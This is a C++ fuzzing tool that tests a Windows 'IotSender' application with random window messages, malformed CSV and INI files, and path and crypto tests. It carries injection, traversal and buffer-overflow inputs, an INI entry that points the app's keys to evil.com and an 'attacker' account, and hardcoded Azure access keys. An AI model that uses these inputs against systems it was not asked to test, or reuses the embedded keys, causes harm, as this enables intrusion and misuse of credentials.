#include <windows.h>
#include <wincrypt.h>
#include <iostream>
#include <fstream>
#include <string>
#include <vector>
#include <random>
#include <chrono>
#include <thread>
#include <filesystem>
#include <algorithm>
#include <cstring>
#include <sstream>
#include <iomanip>
#include <ctime>

namespace fs = std::filesystem;

// Constants from IotSender
const std::string WINDOW_NAME = "IotSender";
const int SEND_IOT_COM = 0x8000;
const int SEND_IOT_LOG = 0x8001;
const std::string DEFAULT_AES_KEY = "Gemini";

// Logging configuration
const std::string LOG_DIR = "fuzzer_logs";
const std::string CRASH_LOG = "crashes.log";
const std::string TEST_LOG = "tests.log";

// Sample connection strings
const std::string SAMPLE_COMMAND_KEY = "HostName=GeminiIoTHub.azure-devices.net;SharedAccessKeyName=iothubowner;SharedAccessKey=PRhgBKV9FQWI836MOg7TWWTxd7qrVKWbaAIoTCihtdE=;DeviceId=";
const std::string SAMPLE_ZIPFILE_KEY = "DefaultEndpointsProtocol=https;AccountName=geminiblobs;AccountKey=B4d8cda3YjfdkSF7IIjwADE7rcbmEpaXU2e8/ajLtEKX9z8XSOynxddye3QUm1sv58oW5R5YzbJv+AStx14/1w==;EndpointSuffix=core.windows.net";

// Function declarations
void WindowsMessageFuzzer(HWND hWnd);
void CSVFileFuzzer(const std::string& workingPath);
void PathFuzzer(const std::string& workingPath);
void IniFileFuzzer(const std::string& workingPath);
void CryptoFuzzer();
std::string GenerateCSVContent(const std::string& fuzzType, const std::string& pathParam = "");
void StartIotSenderIfNeeded();
void RestartIotSender();
void EnsureDirectoryExists(const std::string& path);
std::string EncryptString(const std::string& plainText, const std::string& key);
std::string DecryptString(const std::string& cipherText, const std::string& key);
std::string PadKey(const std::string& key);
std::string Base64Encode(const std::vector<BYTE>& data);
std::vector<BYTE> Base64Decode(const std::string& data);
void PrepareCSVTestFiles(const std::string& workingPath);

// Function to get current timestamp
std::string GetTimestamp() {
    auto now = std::chrono::system_clock::now();
    auto time = std::chrono::system_clock::to_time_t(now);
    std::stringstream ss;
    ss << std::put_time(std::localtime(&time), "%Y-%m-%d %H:%M:%S");
    return ss.str();
}

// Enhanced logging function
void LogEvent(const std::string& message, const std::string& logFile = TEST_LOG) {
    std::string timestamp = GetTimestamp();
    fs::path logPath = fs::path(LOG_DIR) / logFile;
    
    std::ofstream log(logPath.string(), std::ios::app);
    if (log.is_open()) {
        log << "[" << timestamp << "] " << message << std::endl;
        log.close();
    }
    
    std::cout << "[" << timestamp << "] " << message << std::endl;
}

// Function to check if process is still running
bool IsProcessRunning(HWND hWnd) {
    if (hWnd == NULL) return false;
    DWORD processId;
    GetWindowThreadProcessId(hWnd, &processId);
    HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, processId);
    if (hProcess == NULL) return false;
    
    DWORD exitCode;
    GetExitCodeProcess(hProcess, &exitCode);
    CloseHandle(hProcess);
    return exitCode == STILL_ACTIVE;
}

int main(int argc, char* argv[]) {
    // Create log directory
    fs::create_directories(LOG_DIR);
    
    std::string workingPath = "C:\\Program Files (x86)\\G1200\\IotTemp";
    if (argc > 1) {
        workingPath = argv[1];
        LogEvent("Using custom working path: " + workingPath);
    }
    
    LogEvent("IotSender Fuzzer - Security Testing Tool");
    LogEvent("=======================================");
    
    EnsureDirectoryExists(workingPath);
    PrepareCSVTestFiles(workingPath);
    StartIotSenderIfNeeded();
    
    try {
        HWND hWnd = FindWindowA(NULL, WINDOW_NAME.c_str());
        if (hWnd == NULL) {
            LogEvent("IotSender window not found!");
            return 1;
        }
        
        // Run fuzzing routines
        WindowsMessageFuzzer(hWnd);
        CSVFileFuzzer(workingPath);
        PathFuzzer(workingPath);
        IniFileFuzzer(workingPath);
        CryptoFuzzer();
        
        LogEvent("Fuzzing completed.");
    }
    catch (const std::exception& ex) {
        LogEvent("Fatal error: " + std::string(ex.what()));
        return 1;
    }
    
    LogEvent("Press any key to exit...");
    std::cin.get();
    return 0;
}

void WindowsMessageFuzzer(HWND hWnd) {
    LogEvent("Starting Windows Message Fuzzing...");
    
    // Test standard messages
    LogEvent("Testing standard messages...");
    SendMessage(hWnd, SEND_IOT_COM, 0, 0);
    std::this_thread::sleep_for(std::chrono::milliseconds(500));
    
    if (!IsProcessRunning(hWnd)) {
        LogEvent("CRASH DETECTED: Process terminated after SEND_IOT_COM", CRASH_LOG);
        return;
    }
    
    SendMessage(hWnd, SEND_IOT_LOG, 0, 0);
    std::this_thread::sleep_for(std::chrono::milliseconds(500));
    
    if (!IsProcessRunning(hWnd)) {
        LogEvent("CRASH DETECTED: Process terminated after SEND_IOT_LOG", CRASH_LOG);
        return;
    }
    
    // Fuzz with random message IDs
    LogEvent("Fuzzing with random message IDs...");
    std::random_device rd;
    std::mt19937 gen(rd());
    std::uniform_int_distribution<> dis(0x7000, 0x9000);
    
    for (int i = 0; i < 100; i++) {
        int randomMsg = dis(gen);
        std::stringstream ss;
        ss << "Testing message ID: 0x" << std::hex << randomMsg;
        LogEvent(ss.str());
        
        SendMessage(hWnd, randomMsg, 0, 0);
        std::this_thread::sleep_for(std::chrono::milliseconds(50));
        
        if (!IsProcessRunning(hWnd)) {
            ss.str("");
            ss << "CRASH DETECTED: Process terminated after message 0x" << std::hex << randomMsg;
            LogEvent(ss.str(), CRASH_LOG);
            return;
        }
    }
    
    // Fuzz with wParam and lParam
    LogEvent("Fuzzing with wParam and lParam...");
    for (int i = 0; i < 50; i++) {
        WPARAM wParam = dis(gen);
        LPARAM lParam = dis(gen);
        
        std::stringstream ss;
        ss << "Testing wParam: 0x" << std::hex << wParam << ", lParam: 0x" << lParam;
        LogEvent(ss.str());
        
        SendMessage(hWnd, SEND_IOT_COM, wParam, lParam);
        std::this_thread::sleep_for(std::chrono::milliseconds(50));
        
        if (!IsProcessRunning(hWnd)) {
            ss.str("");
            ss << "CRASH DETECTED: Process terminated after SEND_IOT_COM with wParam: 0x" 
               << std::hex << wParam << ", lParam: 0x" << lParam;
            LogEvent(ss.str(), CRASH_LOG);
            return;
        }
        
        SendMessage(hWnd, SEND_IOT_LOG, wParam, lParam);
        std::this_thread::sleep_for(std::chrono::milliseconds(50));
        
        if (!IsProcessRunning(hWnd)) {
            ss.str("");
            ss << "CRASH DETECTED: Process terminated after SEND_IOT_LOG with wParam: 0x" 
               << std::hex << wParam << ", lParam: 0x" << lParam;
            LogEvent(ss.str(), CRASH_LOG);
            return;
        }
    }

    // New targeted fuzzing around crash-inducing values
    LogEvent("Starting targeted fuzzing around crash-inducing values...");
    const WPARAM crashWParam = 0x8221;
    const LPARAM crashLParam = 0x82fc;
    
    // Create distributions for targeted fuzzing
    std::uniform_int_distribution<> wParamDis(crashWParam - 0x100, crashWParam + 0x100);
    std::uniform_int_distribution<> lParamDis(crashLParam - 0x100, crashLParam + 0x100);
    
    // Test 500 variations around the crash-inducing values
    for (int i = 0; i < 500; i++) {
        WPARAM wParam = wParamDis(gen);
        LPARAM lParam = lParamDis(gen);
        
        std::stringstream ss;
        ss << "Testing targeted wParam: 0x" << std::hex << wParam << ", lParam: 0x" << lParam;
        LogEvent(ss.str());
        
        SendMessage(hWnd, SEND_IOT_COM, wParam, lParam);
        std::this_thread::sleep_for(std::chrono::milliseconds(50));
        
        if (!IsProcessRunning(hWnd)) {
            ss.str("");
            ss << "CRASH DETECTED: Process terminated after SEND_IOT_COM with wParam: 0x" 
               << std::hex << wParam << ", lParam: 0x" << lParam;
            LogEvent(ss.str(), CRASH_LOG);
            return;
        }
    }
}

void CSVFileFuzzer(const std::string& workingPath) {
    LogEvent("Starting CSV File Fuzzing...");
    fs::path commandFilePath = fs::path(workingPath) / "Command.csv";
    
    std::vector<std::string> fuzzTypes = {
        "Valid", "ExtraColumns", "MissingColumns", "InvalidValues",
        "SpecialChars", "VeryLongValues", "EmptyFile", "Unicode",
        "BufferOverflow", "SQLInjection", "CommandInjection"
    };
    
    HWND hWnd = FindWindowA(NULL, WINDOW_NAME.c_str());
    if (hWnd == NULL) {
        LogEvent("IotSender window not found!");
        return;
    }
    
    for (const auto& fuzzType : fuzzTypes) {
        std::stringstream ss;
        ss << "Testing " << fuzzType << " CSV format...";
        LogEvent(ss.str());
        
        std::string csvContent = GenerateCSVContent(fuzzType);
        std::ofstream file(commandFilePath.string());
        if (file.is_open()) {
            file << csvContent;
            file.close();
            
            // Save test case
            fs::path testCasePath = fs::path(LOG_DIR) / ("testcase_" + fuzzType + ".csv");
            std::ofstream testCase(testCasePath.string());
            if (testCase.is_open()) {
                testCase << csvContent;
                testCase.close();
            }
            
            SendMessage(hWnd, SEND_IOT_COM, 0, 0);
            std::this_thread::sleep_for(std::chrono::milliseconds(1000));
            
            if (!IsProcessRunning(hWnd)) {
                ss.str("");
                ss << "CRASH DETECTED: Process terminated after " << fuzzType << " CSV test";
                LogEvent(ss.str(), CRASH_LOG);
                return;
            }
            
            SendMessage(hWnd, SEND_IOT_LOG, 0, 0);
            std::this_thread::sleep_for(std::chrono::milliseconds(1000));
            
            if (!IsProcessRunning(hWnd)) {
                ss.str("");
                ss << "CRASH DETECTED: Process terminated after " << fuzzType << " CSV test";
                LogEvent(ss.str(), CRASH_LOG);
                return;
            }
        }
    }
}

void PathFuzzer(const std::string& workingPath) {
    std::cout << "\nStarting Path Fuzzing..." << std::endl;

    std::vector<std::string> pathFuzzPatterns = {
        "../../../Windows/win.ini",
        "..\\..\\..\\Windows\\win.ini",
        "C:\\Windows\\win.ini",
        "\\\\?\\C:\\Windows\\win.ini",
        "COM1",
        "NUL",
        "file://c:/Windows/win.ini",
        "%00test.csv",
        "test\0.csv",
        "test%0A.csv"
    };

    HWND hWnd = FindWindowA(NULL, WINDOW_NAME.c_str());
    if (hWnd == NULL) {
        std::cout << "IotSender window not found!" << std::endl;
        return;
    }

    for (const auto& pathPattern : pathFuzzPatterns) {
        try {
            fs::path testPath = fs::path(workingPath) / pathPattern;
            std::cout << "Testing path: " << testPath << std::endl;

            // Fix the remove_if usage
            std::string sanitizedPath = pathPattern;
            sanitizedPath.erase(
                std::remove_if(sanitizedPath.begin(), sanitizedPath.end(),
                    [](char c) { return c == ':' || c == '\\' || c == '/'; }),
                sanitizedPath.end()
            );
            fs::path safeTestPath = fs::path(workingPath) / sanitizedPath;

            // Create test file
            std::ofstream file(safeTestPath);
            if (file.is_open()) {
                file << GenerateCSVContent("Valid");
                file.close();
            }

            // Create command file
            fs::path commandFilePath = fs::path(workingPath) / "Command.csv";
            std::ofstream cmdFile(commandFilePath);
            if (cmdFile.is_open()) {
                cmdFile << GenerateCSVContent("PathTraversal", pathPattern);
                cmdFile.close();
            }

            SendMessage(hWnd, SEND_IOT_COM, 0, 0);
            std::this_thread::sleep_for(std::chrono::milliseconds(1000));
            SendMessage(hWnd, SEND_IOT_LOG, 0, 0);
            std::this_thread::sleep_for(std::chrono::milliseconds(1000));
        }
        catch (const std::exception& ex) {
            std::cout << "Exception during path test: " << ex.what() << std::endl;
        }
    }
}

void IniFileFuzzer(const std::string& workingPath) {
    std::cout << "\nStarting INI File Fuzzing..." << std::endl;

    fs::path iniPath = fs::path(workingPath).parent_path() / "IotSender.ini";
    
    if (!fs::exists(iniPath)) {
        std::cout << "INI file not found at expected path: " << iniPath << std::endl;
        return;
    }

    std::cout << "Found INI file at: " << iniPath << std::endl;
    
    // Backup the original INI file
    std::string backupPath = iniPath.string() + ".backup";
    fs::copy_file(iniPath, backupPath, fs::copy_options::overwrite_existing);
    std::cout << "Backed up original INI to: " << backupPath << std::endl;

    try {
        std::vector<std::string> iniFuzzPatterns = {
            // Add [OriginalKey] section to test backdoor
            "[OriginalKey]\nCommandKey=HostName=evil.com\nZipFileKey=DefaultEndpointsProtocol=https;AccountName=attacker;",
            
            // Test extremely long values
            "WorkingPath=" + std::string(8192, 'A'),
            
            // Test SQL injection-like patterns
            "CommandKey='; DROP TABLE users; --",
            
            // Test command injection
            "WorkingPath=`calc.exe`",
            
            // Test UTF-8 encoding issues
            "WorkingPath=ЖЖЖЖиии",
            
            // Test null byte
            "WorkingPath=C:\\temp\0evil"
        };

        for (const auto& iniPattern : iniFuzzPatterns) {
            try {
                std::cout << "Testing modified INI..." << std::endl;
                std::ofstream iniFile(iniPath);
                if (iniFile.is_open()) {
                    iniFile << iniPattern;
                    iniFile.close();
                }

                RestartIotSender();
                std::this_thread::sleep_for(std::chrono::milliseconds(2000));

                HWND hWnd = FindWindowA(NULL, WINDOW_NAME.c_str());
                if (hWnd != NULL) {
                    SendMessage(hWnd, SEND_IOT_COM, 0, 0);
                    std::this_thread::sleep_for(std::chrono::milliseconds(1000));
                }
            }
            catch (const std::exception& ex) {
                std::cout << "Exception during INI test: " << ex.what() << std::endl;
            }
        }
    }
    catch (const std::exception& ex) {
        std::cout << "Exception during INI test: " << ex.what() << std::endl;
    }
    
    // Restore the original INI file
    try {
        fs::copy_file(backupPath, iniPath, fs::copy_options::overwrite_existing);
        std::cout << "Restored original INI file" << std::endl;
    }
    catch (const std::exception& ex) {
        std::cout << "Failed to restore INI file: " << ex.what() << std::endl;
        std::cout << "Backup is available at: " << backupPath << std::endl;
    }
    
    RestartIotSender();
}

void CryptoFuzzer() {
    std::cout << "\nStarting Crypto Fuzzing..." << std::endl;

    // Test the default encryption implementation
    std::cout << "Testing default encryption..." << std::endl;
    std::string encryptedDefault = EncryptString(SAMPLE_COMMAND_KEY, DEFAULT_AES_KEY);
    std::string decryptedDefault = DecryptString(encryptedDefault, DEFAULT_AES_KEY);
    
    std::cout << "Original: " << SAMPLE_COMMAND_KEY << std::endl;
    std::cout << "Encrypted (Base64): " << encryptedDefault << std::endl;
    std::cout << "Decrypted: " << decryptedDefault << std::endl;
    std::cout << "Match: " << (SAMPLE_COMMAND_KEY == decryptedDefault) << std::endl;

    // Test with empty key
    try {
        std::cout << "\nTesting with empty key..." << std::endl;
        std::string encryptedEmptyKey = EncryptString(SAMPLE_COMMAND_KEY, "");
        std::cout << "Encrypted (Empty Key): " << encryptedEmptyKey << std::endl;
    }
    catch (const std::exception& ex) {
        std::cout << "Error with empty key: " << ex.what() << std::endl;
    }

    // Test with very long key
    std::cout << "\nTesting with very long key..." << std::endl;
    std::string longKey(100, 'X');
    std::string encryptedLongKey = EncryptString(SAMPLE_COMMAND_KEY, longKey);
    std::string decryptedLongKey = DecryptString(encryptedLongKey, longKey);
    std::cout << "Match with long key: " << (SAMPLE_COMMAND_KEY == decryptedLongKey) << std::endl;

    // Test with key length exactly 32 (AES-256)
    std::cout << "\nTesting with 32-byte key..." << std::endl;
    std::string key32(32, 'K');
    std::string encrypted32 = EncryptString(SAMPLE_COMMAND_KEY, key32);
    std::string decrypted32 = DecryptString(encrypted32, key32);
    std::cout << "Match with 32-byte key: " << (SAMPLE_COMMAND_KEY == decrypted32) << std::endl;
}

std::string GenerateCSVContent(const std::string& fuzzType, const std::string& pathParam) {
    if (fuzzType == "Valid") {
        return "10\t1\t1\tAA999999B\tAA999999B\t\t1\t1\t20230101\t123456\t0\t1\t0\t15\t17.5\t18.2\t123456\t1\t1.234\t2.345\t3.456\tTEST_MEMO";
    }
    else if (fuzzType == "ExtraColumns") {
        return "10\t1\t1\tAA999999B\tAA999999B\t\t1\t1\t20230101\t123456\t0\t1\t0\t15\t17.5\t18.2\t123456\t1\t1.234\t2.345\t3.456\tTEST_MEMO\tEXTRA1\tEXTRA2\tEXTRA3\tEXTRA4\tEXTRA5";
    }
    else if (fuzzType == "MissingColumns") {
        return "10\t1\t1\tAA999999B";
    }
    else if (fuzzType == "InvalidValues") {
        return "999\t999\t999\tAA999999B\tAA999999B\t\t-1\t-1\t99999999\t999999\t9\t9\t9\t999\t999.9\t999.9\t999999\t9\t999.9\t999.9\t999.9\tTEST_MEMO";
    }
    else if (fuzzType == "SpecialChars") {
        return "10\t1\t1\t!@#$%^&*()\t!@#$%^&*()\t\t1\t1\t20230101\t123456\t0\t1\t0\t15\t17.5\t18.2\t123456\t1\t1.234\t2.345\t3.456\t</script><script>alert(1)</script>";
    }
    else if (fuzzType == "VeryLongValues") {
        return "10\t1\t1\t" + std::string(1000, 'A') + "\t" + std::string(1000, 'B') + "\t\t1\t1\t20230101\t123456\t0\t1\t0\t15\t17.5\t18.2\t123456\t1\t1.234\t2.345\t3.456\t" + std::string(5000, 'C');
    }
    else if (fuzzType == "EmptyFile") {
        return "";
    }
    else if (fuzzType == "Unicode") {
        return "10\t1\t1\tЖЖЖЖиии\tЖЖЖЖиии\t\t1\t1\t20230101\t123456\t0\t1\t0\t15\t17.5\t18.2\t123456\t1\t1.234\t2.345\t3.456\t你好世界";
    }
    else if (fuzzType == "BufferOverflow") {
        return "10\t1\t1\t" + std::string(8192, 'A') + "\t" + std::string(8192, 'B');
    }
    else if (fuzzType == "SQLInjection") {
        return "10\t1\t1\t'; DROP TABLE users; --\tAA999999B\t\t1\t1\t20230101\t123456\t0\t1\t0\t15\t17.5\t18.2\t123456\t1\t1.234\t2.345\t3.456\tTEST_MEMO";
    }
    else if (fuzzType == "CommandInjection") {
        return "10\t1\t1\t`calc.exe`\tAA999999B\t\t1\t1\t20230101\t123456\t0\t1\t0\t15\t17.5\t18.2\t123456\t1\t1.234\t2.345\t3.456\tTEST_MEMO";
    }
    else if (fuzzType == "PathTraversal") {
        return "70\t1\t1\tAA999999B\tAA999999B\t" + pathParam + "\t1";
    }

    return "";
}

void StartIotSenderIfNeeded() {
    HWND hWnd = FindWindowA(NULL, WINDOW_NAME.c_str());
    if (hWnd == NULL) {
        std::vector<std::string> possiblePaths = {
            "C:\\Program Files (x86)\\G1200\\IotSender\\IotSender.exe",
            "C:\\Program Files\\G1200\\IotSender\\IotSender.exe",
            ".\\IotSender\\bin\\Debug\\net8.0-windows\\IotSender.exe"
        };

        for (const auto& path : possiblePaths) {
            if (fs::exists(path)) {
                std::cout << "Starting IotSender from " << path << std::endl;
                ShellExecuteA(NULL, "open", path.c_str(), NULL, NULL, SW_SHOW);
                std::this_thread::sleep_for(std::chrono::milliseconds(2000));
                return;
            }
        }

        std::cout << "Warning: Could not find IotSender.exe to start" << std::endl;
    }
    else {
        std::cout << "IotSender is already running" << std::endl;
    }
}

void RestartIotSender() {
    // Kill any existing IotSender processes
    HWND hWnd = FindWindowA(NULL, WINDOW_NAME.c_str());
    if (hWnd != NULL) {
        SendMessage(hWnd, WM_CLOSE, 0, 0);
        std::this_thread::sleep_for(std::chrono::milliseconds(2000));
    }

    // Start a new instance
    StartIotSenderIfNeeded();
}

void EnsureDirectoryExists(const std::string& path) {
    if (!fs::exists(path)) {
        try {
            fs::create_directories(path);
            std::cout << "Created directory: " << path << std::endl;
        }
        catch (const std::exception& ex) {
            std::cout << "Failed to create directory " << path << ": " << ex.what() << std::endl;
        }
    }
}

std::string EncryptString(const std::string& plainText, const std::string& key) {
    if (plainText.empty()) {
        throw std::runtime_error("Plain text cannot be empty");
    }
    if (key.empty()) {
        throw std::runtime_error("Key cannot be empty");
    }

    HCRYPTPROV hProv = 0;
    HCRYPTHASH hHash = 0;
    HCRYPTKEY hKey = 0;
    std::vector<BYTE> encryptedData;
    
    try {
        // Get handle to the default provider
        if (!CryptAcquireContext(&hProv, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT)) {
            DWORD error = GetLastError();
            throw std::runtime_error("CryptAcquireContext failed with error: " + std::to_string(error));
        }

        // Create hash object
        if (!CryptCreateHash(hProv, CALG_SHA_256, 0, 0, &hHash)) {
            DWORD error = GetLastError();
            throw std::runtime_error("CryptCreateHash failed with error: " + std::to_string(error));
        }

        // Hash the key
        if (!CryptHashData(hHash, (BYTE*)key.c_str(), key.length(), 0)) {
            DWORD error = GetLastError();
            throw std::runtime_error("CryptHashData failed with error: " + std::to_string(error));
        }

        // Derive key from hash
        if (!CryptDeriveKey(hProv, CALG_AES_256, hHash, 0, &hKey)) {
            DWORD error = GetLastError();
            throw std::runtime_error("CryptDeriveKey failed with error: " + std::to_string(error));
        }

        // Determine buffer size
        DWORD dataLen = plainText.length();
        DWORD bufferLen = dataLen;
        if (!CryptEncrypt(hKey, 0, TRUE, 0, NULL, &bufferLen, 0)) {
            DWORD error = GetLastError();
            throw std::runtime_error("CryptEncrypt (size) failed with error: " + std::to_string(error));
        }

        // Encrypt data
        encryptedData.resize(bufferLen);
        memcpy(encryptedData.data(), plainText.c_str(), dataLen);
        if (!CryptEncrypt(hKey, 0, TRUE, 0, encryptedData.data(), &dataLen, bufferLen)) {
            DWORD error = GetLastError();
            throw std::runtime_error("CryptEncrypt failed with error: " + std::to_string(error));
        }
        encryptedData.resize(dataLen);

        // Clean up
        if (hKey) CryptDestroyKey(hKey);
        if (hHash) CryptDestroyHash(hHash);
        if (hProv) CryptReleaseContext(hProv, 0);

        return Base64Encode(encryptedData);
    }
    catch (...) {
        // Clean up in case of error
        if (hKey) CryptDestroyKey(hKey);
        if (hHash) CryptDestroyHash(hHash);
        if (hProv) CryptReleaseContext(hProv, 0);
        throw;
    }
}

std::string DecryptString(const std::string& cipherText, const std::string& key) {
    if (cipherText.empty()) {
        throw std::runtime_error("Cipher text cannot be empty");
    }
    if (key.empty()) {
        throw std::runtime_error("Key cannot be empty");
    }

    HCRYPTPROV hProv = 0;
    HCRYPTHASH hHash = 0;
    HCRYPTKEY hKey = 0;
    std::vector<BYTE> decryptedData;
    
    try {
        // Get handle to the default provider
        if (!CryptAcquireContext(&hProv, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT)) {
            DWORD error = GetLastError();
            throw std::runtime_error("CryptAcquireContext failed with error: " + std::to_string(error));
        }

        // Create hash object
        if (!CryptCreateHash(hProv, CALG_SHA_256, 0, 0, &hHash)) {
            DWORD error = GetLastError();
            throw std::runtime_error("CryptCreateHash failed with error: " + std::to_string(error));
        }

        // Hash the key
        if (!CryptHashData(hHash, (BYTE*)key.c_str(), key.length(), 0)) {
            DWORD error = GetLastError();
            throw std::runtime_error("CryptHashData failed with error: " + std::to_string(error));
        }

        // Derive key from hash
        if (!CryptDeriveKey(hProv, CALG_AES_256, hHash, 0, &hKey)) {
            DWORD error = GetLastError();
            throw std::runtime_error("CryptDeriveKey failed with error: " + std::to_string(error));
        }

        // Decode base64
        std::vector<BYTE> encryptedData = Base64Decode(cipherText);

        // Decrypt data
        DWORD dataLen = encryptedData.size();
        if (!CryptDecrypt(hKey, 0, TRUE, 0, encryptedData.data(), &dataLen)) {
            DWORD error = GetLastError();
            throw std::runtime_error("CryptDecrypt failed with error: " + std::to_string(error));
        }

        // Clean up
        if (hKey) CryptDestroyKey(hKey);
        if (hHash) CryptDestroyHash(hHash);
        if (hProv) CryptReleaseContext(hProv, 0);

        return std::string(encryptedData.begin(), encryptedData.begin() + dataLen);
    }
    catch (...) {
        // Clean up in case of error
        if (hKey) CryptDestroyKey(hKey);
        if (hHash) CryptDestroyHash(hHash);
        if (hProv) CryptReleaseContext(hProv, 0);
        throw;
    }
}

std::string PadKey(const std::string& key) {
    std::string paddedKey = key;
    if (paddedKey.length() < 32) {
        paddedKey.append(32 - paddedKey.length(), '\0');
    }
    else if (paddedKey.length() > 32) {
        paddedKey = paddedKey.substr(0, 32);
    }
    return paddedKey;
}

std::string Base64Encode(const std::vector<BYTE>& data) {
    DWORD encodedSize = 0;
    if (!CryptBinaryToStringA(data.data(), data.size(), CRYPT_STRING_BASE64 | CRYPT_STRING_NOCRLF, NULL, &encodedSize)) {
        throw std::runtime_error("Failed to get base64 size");
    }

    std::string result(encodedSize, '\0');
    if (!CryptBinaryToStringA(data.data(), data.size(), CRYPT_STRING_BASE64 | CRYPT_STRING_NOCRLF, &result[0], &encodedSize)) {
        throw std::runtime_error("Failed to encode base64");
    }

    // Remove null terminator
    result.resize(encodedSize - 1);
    return result;
}

std::vector<BYTE> Base64Decode(const std::string& data) {
    DWORD decodedSize = 0;
    if (!CryptStringToBinaryA(data.c_str(), data.length(), CRYPT_STRING_BASE64, NULL, &decodedSize, NULL, NULL)) {
        throw std::runtime_error("Failed to get decoded size");
    }

    std::vector<BYTE> result(decodedSize);
    if (!CryptStringToBinaryA(data.c_str(), data.length(), CRYPT_STRING_BASE64, result.data(), &decodedSize, NULL, NULL)) {
        throw std::runtime_error("Failed to decode base64");
    }

    result.resize(decodedSize);
    return result;
}

void PrepareCSVTestFiles(const std::string& workingPath) {
    LogEvent("Preparing CSV test files...");
    fs::path commandFilePath = fs::path(workingPath) / "Command.csv";
    fs::path testFilesDir = fs::path(workingPath) / "test_files";
    
    // Create test files directory
    EnsureDirectoryExists(testFilesDir.string());
    
    // Prepare various test cases
    std::vector<std::pair<std::string, std::string>> testCases = {
        // Basic valid case
        {"valid.csv", "10\t1\t1\tAA999999B\tAA999999B\t\t1\t1\t20230101\t123456\t0\t1\t0\t15\t17.5\t18.2\t123456\t1\t1.234\t2.345\t3.456\tTEST_MEMO"},
        
        // Extra columns
        {"extra_columns.csv", "10\t1\t1\tAA999999B\tAA999999B\t\t1\t1\t20230101\t123456\t0\t1\t0\t15\t17.5\t18.2\t123456\t1\t1.234\t2.345\t3.456\tTEST_MEMO\tEXTRA1\tEXTRA2\tEXTRA3"},
        
        // Missing columns
        {"missing_columns.csv", "10\t1\t1\tAA999999B"},
        
        // Invalid values
        {"invalid_values.csv", "999\t999\t999\tAA999999B\tAA999999B\t\t-1\t-1\t99999999\t999999\t9\t9\t9\t999\t999.9\t999.9\t999999\t9\t999.9\t999.9\t999.9\tTEST_MEMO"},
        
        // Special characters
        {"special_chars.csv", "10\t1\t1\t!@#$%^&*()\t!@#$%^&*()\t\t1\t1\t20230101\t123456\t0\t1\t0\t15\t17.5\t18.2\t123456\t1\t1.234\t2.345\t3.456\t</script><script>alert(1)</script>"},
        
        // Very long values
        {"long_values.csv", "10\t1\t1\t" + std::string(1000, 'A') + "\t" + std::string(1000, 'B') + "\t\t1\t1\t20230101\t123456\t0\t1\t0\t15\t17.5\t18.2\t123456\t1\t1.234\t2.345\t3.456\t" + std::string(5000, 'C')},
        
        // Empty file
        {"empty.csv", ""},
        
        // Unicode characters
        {"unicode.csv", "10\t1\t1\tЖЖЖЖиии\tЖЖЖЖиии\t\t1\t1\t20230101\t123456\t0\t1\t0\t15\t17.5\t18.2\t123456\t1\t1.234\t2.345\t3.456\t你好世界"},
        
        // Buffer overflow attempt
        {"buffer_overflow.csv", "10\t1\t1\t" + std::string(8192, 'A') + "\t" + std::string(8192, 'B')},
        
        // SQL injection attempt
        {"sql_injection.csv", "10\t1\t1\t'; DROP TABLE users; --\tAA999999B\t\t1\t1\t20230101\t123456\t0\t1\t0\t15\t17.5\t18.2\t123456\t1\t1.234\t2.345\t3.456\tTEST_MEMO"},
        
        // Command injection attempt
        {"command_injection.csv", "10\t1\t1\t`calc.exe`\tAA999999B\t\t1\t1\t20230101\t123456\t0\t1\t0\t15\t17.5\t18.2\t123456\t1\t1.234\t2.345\t3.456\tTEST_MEMO"},
        
        // Path traversal attempt
        {"path_traversal.csv", "70\t1\t1\tAA999999B\tAA999999B\t..\\..\\..\\Windows\\win.ini\t1"},
        
        // Null bytes
        {"null_bytes.csv", "10\t1\t1\tAA999999B\0\tAA999999B\t\t1\t1\t20230101\t123456\t0\t1\t0\t15\t17.5\t18.2\t123456\t1\t1.234\t2.345\t3.456\tTEST_MEMO"},
        
        // Line feed injection
        {"line_feed.csv", "10\t1\t1\tAA999999B\tAA999999B\t\t1\t1\t20230101\t123456\t0\t1\t0\t15\t17.5\t18.2\t123456\t1\t1.234\t2.345\t3.456\tTEST\nMEMO"},
        
        // Carriage return injection
        {"carriage_return.csv", "10\t1\t1\tAA999999B\tAA999999B\t\t1\t1\t20230101\t123456\t0\t1\t0\t15\t17.5\t18.2\t123456\t1\t1.234\t2.345\t3.456\tTEST\rMEMO"},
        
        // Tab injection
        {"tab_injection.csv", "10\t1\t1\tAA999999B\tAA999999B\t\t1\t1\t20230101\t123456\t0\t1\t0\t15\t17.5\t18.2\t123456\t1\t1.234\t2.345\t3.456\tTEST\tMEMO"},
        
        // Multiple commands
        {"multiple_commands.csv", "10\t1\t1\tAA999999B\tAA999999B\t\t1\t1\t20230101\t123456\t0\t1\t0\t15\t17.5\t18.2\t123456\t1\t1.234\t2.345\t3.456\tTEST_MEMO\n20\t1\t1\tBB999999B\tBB999999B\t\t1\t1\t20230101\t123456\t0\t1\t0\t15\t17.5\t18.2\t123456\t1\t1.234\t2.345\t3.456\tTEST_MEMO2"}
    };
    
    // Create each test file
    for (const auto& testCase : testCases) {
        fs::path filePath = testFilesDir / testCase.first;
        std::ofstream file(filePath);
        if (file.is_open()) {
            file << testCase.second;
            file.close();
            LogEvent("Created test file: " + testCase.first);
        }
    }
    
    // Create the main Command.csv file with a valid test case
    std::ofstream commandFile(commandFilePath);
    if (commandFile.is_open()) {
        commandFile << "10\t1\t1\tAA999999B\tAA999999B\t\t1\t1\t20230101\t123456\t0\t1\t0\t15\t17.5\t18.2\t123456\t1\t1.234\t2.345\t3.456\tTEST_MEMO";
        commandFile.close();
        LogEvent("Created main Command.csv file");
    }
    
    LogEvent("CSV test files preparation completed");
} 
